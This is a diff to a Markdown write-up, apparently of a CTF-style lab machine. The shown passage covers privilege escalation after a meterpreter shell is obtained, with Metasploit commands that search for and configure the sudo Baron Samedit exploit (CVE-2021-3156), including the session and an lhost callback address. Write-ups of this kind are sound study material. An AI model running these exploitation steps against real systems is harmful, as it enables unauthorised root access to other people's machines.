@@ -82,10 +82,10 @@ What resulted was a meterpreter shell on the web server, which from there using 
  
 ### Privilege Escalation
  
-From this I upgraded to a tty and then backgrounded my shell session and metasploit session. One of the questions mentions an old version of sudo is running, so I search Metasploit for an exploit on this and land on `linux/local/sudo_baron_samedit`.
+From this I upgraded to a tty and then backgrounded my shell session and metasploit session. One of the questions mentions an old version of sudo is running, so I search using searchsploit and looking at potential candidates I find sudo baron samedit, pulling the cve and searching for it gives me `linux/local/sudo_baron_samedit`.
  
 ```diff
-+ msf6 > search sudo baron samedit
++ msf6 > search cve:2021-3156
 + msf6 > use linux/local/sudo_baron_samedit
 + msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
 + msf6 exploit(linux/local/sudo_baron_samedit) > set lhost 10.10.14.36
